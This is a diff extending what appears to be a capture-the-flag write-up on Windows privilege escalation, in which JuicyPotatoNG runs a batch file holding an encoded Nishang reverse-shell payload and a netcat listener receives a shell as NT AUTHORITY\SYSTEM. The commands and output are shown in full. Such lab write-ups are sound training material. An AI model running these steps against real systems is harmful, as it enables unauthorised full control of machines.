@@ -43,9 +43,34 @@ Mode                LastWriteTime         Length Name
 
 N/B: With the payload i have just use nishanga (OnelineTcp payload) and encode it in powershell encoded method to make the script work, simple like that.
 ```
-After we have done this 
+After we have done this we need now to start our netcat session on our machine and execute the bat file as follows
+```
+C:\temp
 
 
+PS C:\temp> .\potato.exe -t * -p C:\temp\a.bat
+
+
+         JuicyPotatoNG
+         by decoder_it & splinter_code
+
+[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247 
+[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\SYSTEM;Impersonation
+[+] CreateProcessAsUser OK
+[+] Exploit successful! 
+PS C:\temp> 
+```
+
+And on our netcat session we get this one 
+```
+┌──(alienx㉿alienX)-[/usr/share/doc/python3-impacket/examples]
+└─$ nc -nlvp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.32] from (UNKNOWN) [10.10.11.168] 60669
+whoami
+nt authority\system
+PS C:\> dir 
+```
 
 
 # AND WERE DONE WITH JUICEPOTATO BINARY
